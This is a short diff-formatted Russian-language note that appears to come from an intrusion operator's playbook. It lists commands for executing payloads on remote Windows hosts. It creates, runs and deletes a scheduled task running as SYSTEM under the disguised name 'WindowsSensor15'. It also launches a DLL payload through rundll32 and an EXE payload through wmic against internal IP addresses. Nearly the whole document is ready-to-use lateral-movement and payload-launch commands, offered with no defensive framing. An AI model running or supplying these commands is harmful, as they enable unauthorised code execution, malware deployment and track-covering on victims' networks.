@@ -1,0 +1,10 @@
+Можно запускать пелойд или какой нибудь батник при помощи ШТАСКА
+shell SCHTASKS /s айпи\хостнейм /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00:00
+shell SCHTASKS /s айпи\хостнейм /run /TN "WindowsSensor15"
+shell schtasks /S айпи\хостнейм /TN "WindowsSensor15" /DELETE /F
+
+запуск длл пелойда выглядит так
+shell wmic /node:172.16.0.36 process call create "rundll32.exe C:\ProgramData\p64.dll StartW"
+
+ shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe" 
+Запуск EXE пелойда
